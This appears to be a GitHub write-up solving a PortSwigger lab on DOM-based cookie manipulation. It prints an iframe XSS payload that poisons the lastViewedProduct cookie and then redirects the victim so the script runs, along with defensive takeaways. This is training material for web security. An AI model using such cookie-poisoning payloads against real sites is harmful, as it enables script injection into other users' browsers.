# DOM-based cookie manipulation

## 📌 Lab Details
- **Title**: DOM-based cookie manipulation
- **Difficulty**: Practitioner
- **Category**: DOM-based vulnerability
- **Lab URL**: https://portswigger.net/academy/labs/launch/a248974a24dd4abd637f526afb96bb349d49b2ad790756b97c46f47203781c6a?referrer=%2fweb-security%2fdom-based%2fcookie-manipulation%2flab-dom-cookie-manipulation

## 🔍 Summary
This lab demonstrates **DOM-based client-side cookie poisoning**, where you inject a malicious URL containing an XSS payload into a `lastViewedProduct` cookie, which later triggers `print()` when the victim visits the home page.

## 🛠 Steps to Solve
1. Notice that the home page uses a client-side cookie called `lastViewedProduct`, whose value is the URL of the last product page that the user visited.
2. Inject the payload on the **Exploit** server:
   ```sh
   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
   ```
3. Store the exploit and deliver it to the victim.

## 📖 Key Takeaways
- Shows how client-side JavaScript setting unvalidated cookies can be abused for XSS.
- Uses an iframe to poison the `lastViewedProduct` cookie silently, then redirects the victim to the home page to trigger the XSS.
- Highlights that client-side trust in cookie values is dangerous and can lead to DOM-based XSS if used in sinks without sanitization.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/fcf9d886-7d86-454b-89f6-c44a6687823e)
![image](https://github.com/user-attachments/assets/a2751049-b8f0-40d1-858f-70f2151fc7b8)
![image](https://github.com/user-attachments/assets/d6655d44-0989-4aef-a832-a53e683f7107)
![image](https://github.com/user-attachments/assets/5aaeaa2e-aa29-4452-a736-797db9be8e12)
![image](https://github.com/user-attachments/assets/6afb3a38-ae6f-4383-a612-0642b98b8211)
